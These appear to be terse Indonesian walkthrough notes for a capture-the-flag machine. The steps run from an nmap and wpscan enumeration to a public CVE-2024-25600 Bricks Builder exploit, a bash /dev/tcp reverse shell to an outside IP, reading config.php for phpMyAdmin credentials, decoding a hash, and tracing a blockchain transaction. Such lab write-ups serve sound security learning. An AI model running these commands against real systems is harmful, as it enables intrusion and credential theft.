1. scan nmap -> 22 80 lain kebuka
2. fuzz -> itu wp ternyata ->
3. wpscan --url namaweb --disable-tls-checks
4. check di bricks version nya -> di style keknya -> wp bricks versi exploit -> https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
5. run aja exploitnya -> kalau error butuh module tinggal pip3 install namamodule
6. bash -c 'exec sh -i >& /dev/tcp/10.9.0.169/6060 0>&1' -> pas udah di shell
7. di situ lgsg ada file cat aja -> cat config.php -> disitu ada creds phpmyadmin   
8. coba -> systemctl list-units --type=service --state=running -> systemctl cat ubuntu.service
9. cd /lib/NetworkManager -> cat inet.conf -> head inet.conf
10. decrypt hash nya -> from hex, from base64, from base64 -> split jadi 2 kan sama itu
11. ke blockchair -> coba masukin tadi -> nanti cek selengkapnya yg transaksi pertama 
12. cek privacy ada issue -> cek senders -> copas id senders cari gugel -> cari sekurity apa gitu -> ketemu
